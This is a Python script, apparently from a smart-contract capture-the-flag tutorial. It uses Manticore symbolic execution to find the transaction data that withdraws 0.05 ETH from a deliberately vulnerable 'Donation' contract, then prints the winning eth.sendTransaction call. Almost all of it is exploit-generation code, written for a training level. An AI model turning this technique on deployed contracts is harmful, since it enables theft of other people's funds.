'''
This first level is a simple script for a simple exploit
Please read through this file and understand how the script
    sets up the symbolic execution framework
You'll have to provide your own wallet address and ctf level address
    on the command or by replacing the strings in this file
'''
# Import Manticore's EVM supporting symbolic execution
from manticore.ethereum import ManticoreEVM
import binascii
import sys

# Parse arguments
#   arg1 = from_address = Your wallet address
#   arg2 = si_level_address = Your Donation CTF level address
#   arg3 = sol_file = Donation CTF level source code to symbolically execute
from_address = int(sys.argv[1], 16) if len(sys.argv)>1 else "<your address here>"
si_level_address = int(sys.argv[2], 16) if len(sys.argv)>2 else "<SI ctf level address>"
sol_file = sys.argv[3] if len(sys.argv)>3 else "../SI_ctf_levels/Donation.sol"

# Fix the amount of gas to use (can omit if you wish to rely on ManticoreEVM estimate)
gas = 100000

# Set the amount of ETH you want to obtain from the contract (0.05 ETH)
contract_balance = int(0.05 * 10**18)

# Read in the contract source
with open(sol_file, "r") as f:
    contract_src = f.read()

# Instantiate Manticore's Symbolic Ethereum Virtual Machine
m = ManticoreEVM()

# Create an account for your wallet address on the EVM.
# Give it enough to deploy vulnerable contract
#   (technically not what is done in real-life)
user_account = m.create_account(address=from_address, balance=contract_balance)

# Create the Donation CTF level contract on the EVM using wallet
#   contract_src = Prior source code
#   contract_name = Name of contract in source code
#   owner = Uses your wallet to deploy (OK for this level)
#   balance = Deploy with msg.value that the CTF level is deployed with
#   args = Arguments to deploy contract (null in this case)
contract_account = m.solidity_create_contract(
    contract_src,
    contract_name="Donation",
    owner=user_account,
    balance=contract_balance,
    args=(0,0)
)

# Ethereum contracts called via msg.data with 4 bytes of the keccak256 hash of the
#   function signature with whitespace removed (e.g. someFunction(uint256,uint256))
# Make symbolic buffer to hold msg.data and ask Manticore to calculate the "winning" value
sym_args = m.make_symbolic_buffer(4)

# Issue a symbolic transaction to the EVM by setting msg.data to symbolic buffer
m.transaction(
    caller=user_account,
    address=contract_account.address,
    data=sym_args,
    value=0,
    gas=gas
)

# Symbolically execute program to find an exploit that obtains our funds back.
for state in m.running_states:
    world = state.platform
    # Check if funds can be retrieved
    if state.can_be_true(world.get_balance(user_account.address) == contract_balance):
      # If so, add constraint
      #   Then concretize symbolic buffer to provide one solution
      state.constraints.add(world.get_balance(user_account.address) == contract_balance)
      conc_args = state.solve_one(sym_args)
      # Print out our transaction to send to win
      print(f'''eth.sendTransaction({{data:"0x{conc_args.hex()}", from:"{hex(from_address)}", to:"{hex(si_level_address)}", gas:{gas}}})''')
      sys.exit(0)

print("No valid states found")
